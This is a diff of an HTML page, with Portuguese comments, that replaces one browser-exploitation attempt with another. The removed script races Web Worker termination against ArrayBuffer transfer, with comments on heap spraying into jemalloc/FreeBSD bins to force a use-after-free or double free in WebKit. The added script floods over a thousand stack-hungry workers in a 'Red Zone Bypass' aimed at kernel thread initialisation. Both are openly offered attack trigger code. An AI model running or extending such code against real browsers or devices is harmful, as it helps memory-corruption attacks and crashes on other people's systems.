@@ -1,63 +1,64 @@
-<!DOCTYPE html>
 <html>
+<head>
+    <meta charset="UTF-8">
+    <title>Kernel Panic</title>
+    
+</head>
 <body>
-<h1>UAF / Double Free Attempt</h1>
-<button onclick="runUAFTest()">Iniciar Race Condition</button>
-<div id="log"></div>
 
-<script>
-    function log(msg) { 
-        document.getElementById('log').innerHTML = msg; 
-    }
+    <h1>Red Zone Bypass</h1>
 
-    function runUAFTest() {
-        log("Iniciando Race de Transferência/Terminação...");
-        
-        // Código do Worker: tenta escrever na memória recebida
-        const workerCode = `
-            self.onmessage = function(e) {
-                // Tenta acessar e modificar a memória transferida
-                const arr = new Uint8Array(e.data);
-                arr[0] = 0xFF; 
-                // Segurar a thread viva por um microssegundo pode ajudar a alargar a janela
-                for(let i=0; i<100; i++) {}; 
-                postMessage("Pong");
-            };
-        `;
-        const blob = new Blob([workerCode], {type: 'application/javascript'});
-        const url = URL.createObjectURL(blob);
+    
 
-        let iterations = 0;
-        
-        const interval = setInterval(() => {
-            iterations++;
+    <div class="section">
+         <button class="kernel" onclick="runRedZoneBypass()">Stack Red Zone Bypass (Thr Init)</button>
+            </div>
+
+    <div id="log"></div>
+    <div id="scroll-dummy"><div style="height:5000px"></div></div>
+
+    <script>
+        function log(msg) { 
+            const el = document.getElementById('log');
+            el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+        }
+
+        // Alvo: "Cannot allocate red zone for initial thread"
+        // Cria threads que usam muita stack imediatamente, competindo com a inicialização.
+        function runRedZoneBypass() {
+            log("[KERNEL] Bypass Red Zone...");
             
-            // 1. Criação
-            const w = new Worker(url);
+            const workerCode = `
+                function deep(n) {
+                    const v = new Float64Array(128); // Usa stack
+                    if (n > 0) deep(n-1);
+                }
+                // Assim que nasce, consome stack
+                deep(10); 
+                postMessage("Done");
+            `;
+            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
             
-            // 2. Alocação de memória (Heap Spraying em pequena escala)
-            // Tamanho específico para cair em "bins" de memória interessantes do Jemalloc/FreeBSD
-            const buffer = new ArrayBuffer(1024 * 8); 
-            
-            // 3. O Gatilho (The Trigger)
-            // Tenta transferir a posse da memória PARA o worker
-            w.postMessage(buffer, [buffer]);
+            // Spawn flood
+            let count = 0;
+            const interval = setInterval(() => {
+                for(let i=0; i<20; i++) {
+                    new Worker(url).onmessage = () => {};
+                }
+                count += 20;
+                if(count > 1000) {
+                    clearInterval(interval);
+                    log("Red Zone Stress finalizado.");
+                }
+            }, 10);
+        }
 
-            // 4. A Corrida (The Race)
-            // Matamos o worker imediatamente.
-            // O Kernel tenta liberar a stack do worker e os recursos associados (o buffer).
-            // Se o WebKit ainda estiver processando o envio, pode tentar liberar o buffer 2x (Double Free)
-            // ou acessar o buffer depois que a thread worker já morreu (UAF).
-            w.terminate();
-
-            // Tentar acessar o buffer aqui na main thread vai dar erro de JS padrão (detached),
-            // mas o que queremos é que o motor do browser (C++) se confunda internamente.
-
-            if(iterations % 100 === 0) log("Tentativas: " + iterations);
-            if(iterations > 5000) clearInterval(interval);
-
-        }, 2); // Intervalo baixíssimo para maximizar colisão
-    }
-</script>
+      </script>
 </body>
 </html>
+
+
+
+
+
+
